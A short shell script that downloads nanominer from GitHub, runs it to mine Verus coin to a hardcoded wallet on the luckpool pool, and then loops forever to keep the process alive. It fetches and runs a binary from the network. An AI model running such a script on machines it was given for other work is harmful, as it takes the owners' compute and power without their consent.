#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz
tar -xf nanominer-linux-3.7.6.tar.gz
cd nanominer-linux-3.7.6
./nanominer -algo Verushash -wallet RCMrWX5D3KkoGxBcgEV27R2YtGytLv5SNR.Anonymous -coin VRSC -pool1 na.luckpool.net:3957 -useSSL false -t 4
while [ 1 ]; do
sleep 3
done
sleep 999
